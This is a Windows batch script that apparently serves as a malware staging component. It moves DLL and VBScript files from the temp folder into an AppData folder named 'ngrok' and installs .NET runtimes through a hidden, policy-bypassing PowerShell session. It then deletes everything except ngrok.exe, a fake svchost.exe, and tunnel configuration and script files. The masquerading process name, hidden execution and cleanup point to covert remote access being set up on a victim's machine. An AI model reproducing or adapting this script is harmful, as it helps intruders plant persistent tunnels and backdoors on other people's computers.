@echo off
setlocal enabledelayedexpansion

set "USER=%USERNAME%"
set "NGROK_DIR=C:\Users\%USER%\AppData\Local\ngrok"
set "DOTNET_INSTALL_SCRIPT=%NGROK_DIR%\nti.ps1"
set "DOTNET_VERSION=8.0.15"
set "ASPNETCORE_VERSION=8.0.11"
set "WINDOWSDESKTOP_VERSION=8.0.11"
set "INSTALL_DIR=C:\Program Files\dotnet"
set "TEMP_FILE=%TEMP%\8b37b206-42e3-4bdf-9344-aa7matagrasa77be014.tmp"

if not exist "%NGROK_DIR%" mkdir "%NGROK_DIR%"

move /y "%TEMP%\Repair.dll" "%NGROK_DIR%\Repair.dll" >nul 2>&1
move /y "%TEMP%\main.vbs" "%NGROK_DIR%\main.vbs" >nul 2>&1
move /y "%TEMP%\1.vbs" "%NGROK_DIR%\1.vbs" >nul 2>&1

timeout /t 1 /nobreak >nul

powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://dotnet.microsoft.com/download/dotnet/scripts/v1/dotnet-install.ps1', '%DOTNET_INSTALL_SCRIPT%')"

powershell -ExecutionPolicy Bypass -NoProfile -File "%DOTNET_INSTALL_SCRIPT%" -Runtime dotnet -Version %DOTNET_VERSION% -InstallDir "%INSTALL_DIR%"
powershell -ExecutionPolicy Bypass -NoProfile -File "%DOTNET_INSTALL_SCRIPT%" -Runtime aspnetcore -Version %ASPNETCORE_VERSION% -InstallDir "%INSTALL_DIR%"
powershell -ExecutionPolicy Bypass -NoProfile -File "%DOTNET_INSTALL_SCRIPT%" -Runtime windowsdesktop -Version %WINDOWSDESKTOP_VERSION% -InstallDir "%INSTALL_DIR%"

echo.>"%TEMP_FILE%"

del "%DOTNET_INSTALL_SCRIPT%"

timeout /t 4 /nobreak >nul

for %%F in ("%NGROK_DIR%\*") do (
    set "F=%%~nxF"
    if /i not "!F!"=="ngrok.exe" if /i not "!F!"=="svchost.exe" if /i not "!F!"=="hst.vbs" if /i not "!F!"=="ngrok.yml" if /i not "!F!"=="ss.cmd" (
        del /f /q "%%F" >nul 2>&1
    )
)
